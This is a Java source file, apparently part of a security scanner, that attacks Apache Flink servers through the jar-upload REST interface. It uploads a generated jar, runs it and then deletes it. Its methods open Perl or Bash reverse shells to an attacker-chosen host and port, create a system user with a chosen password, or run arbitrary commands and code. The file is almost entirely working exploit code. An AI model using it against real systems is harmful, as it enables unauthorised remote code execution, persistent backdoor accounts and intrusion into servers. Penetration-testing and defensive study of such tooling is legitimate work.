package com.gbw.scanner.plugins.scripts.web.flink;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.tools.GBWScannerGenShellJar;
import com.gbw.scanner.utils.HttpUtils;
import com.google.gson.Gson;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;

import java.io.IOException;

public class GBWFlinkAttack {

    private static String jarMainClassPath = "/opt/data/script/jclass/JarMain.class";
    private static String json =" {\"entryClass\":\"JarMain\",\"parallelism\":null,\"programArgs\":null,\"savepointPath\":null,\"allowNonRestoredState\":null}";

    private static void processResponse(GBWHttpResponse response,StringBuffer sb,String prefix){

        if(response == null) {
            sb.append(String.format("%s ,response is empty!\n", prefix));
        } else{

            sb.append(String.format("%s,response status:%d,content:%s\n",prefix,response.getStatus(),response.getContent()));
        }
    }

    private static String runCmd(String jarPath,String proto,String ip,int port){

        StringBuffer sb = new StringBuffer();

        HttpUriRequest httpRequest;
        GBWHttpResponse httpResponse;
        String content;
        Gson gson = new Gson();

        CloseableHttpClient httpClient = null;
        Host host = new Host(ip,ip,port,null,proto);
        GBWScanFlinkScriptConfig config = new GBWScanFlinkScriptConfig();

        config.setConTimeout(100000);
        config.setReadTimeout(100000);
        config.setJarFile(jarPath);
        config.setEntryClass("JarMain");
        config.setSubmitJson(json);

        UPloadStatus uPloadStatus;
        String upFileName = null;

        try {

            httpClient = GBWHttpClientBuilder.make(host.getProto(),host.getPort());
            // try to upload jar
            sb.append(String.format("Try to upload java jar File:%s to Flink Server---->%s:%d\n",jarPath,ip,port));
            httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host,config);
            httpResponse = HttpUtils.send(httpClient,httpRequest,true);
            processResponse(httpResponse,sb,"upload java jar response:\n");

            if(httpResponse.getStatus() == 200){

                content = httpResponse.getContent();
                uPloadStatus = gson.fromJson(content,UPloadStatus.class);
                upFileName = uPloadStatus.getFile();

                if(!TextUtils.isEmpty(upFileName)){
                    /*Try to run */
                    sb.append("Try to run upload java jar-------------\n");
                    httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host,config,upFileName);
                    httpResponse = HttpUtils.send(httpClient,httpRequest,true);
                    processResponse(httpResponse,sb,"run java jar response:\n");
                }

                /*delete jar file*/
                sb.append("Try to clean upload java jar----------------\n");
                httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host,config,upFileName);
                HttpUtils.send(httpClient,httpRequest);

                sb.append(String.format("Attack Flink jar file upload to IP:%s:%d,ok!\n",host.getIp(),host.getPort()));;
            }

        }catch (Exception e){
            sb.append(String.format("Attack Flink jar file upload to IP:%s:%d,Failed:%s!\n",host.getIp(),host.getPort(),e.getMessage()));
            //e.printStackTrace();
        }finally {

            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();
    }

    public static String runPerlShellAttack(String proto,String host,int port,String rhost,int rport){

        String jarPath = null;
        try {
            jarPath = GBWScannerGenShellJar.makePerlShell("PFlink",jarMainClassPath,rhost,rport,true);
        } catch (IOException e) {

            return "make attack java jar failed for perl shell!";
        }

        return runCmd(jarPath,proto,host,port);

    }

    public static String runBashShellAttack(String proto,String host,int port,String rhost,int rport){

        String jarPath = null;
        try {
            jarPath = GBWScannerGenShellJar.makeBashShell("BFlink",jarMainClassPath,rhost,rport,true);
        } catch (IOException e) {

            return "make attack java jar failed for bash shell!";
        }

        return runCmd(jarPath,proto,host,port);
    }

    public static String runCreateUserAttack(String proto,String host,int port,String user,String passwd){

        String jarPath = null;
        try {
            jarPath = GBWScannerGenShellJar.makeCreateUserShell("CFlink",jarMainClassPath,user,passwd,true);
        } catch (IOException e) {

            return "make attack java jar failed for create user!";
        }

        return runCmd(jarPath,proto,host,port);
    }

    public static String runScriptAttack(String proto,String host,int port,String cmd,byte[] code){

        String jarPath = null;
        try {
            jarPath = GBWScannerGenShellJar.makeJarPackage("SFlink",jarMainClassPath,cmd,code,true);
        } catch (IOException e) {

            return "make attack java jar failed for running code!";
        }

        return runCmd(jarPath,proto,host,port);
    }


}
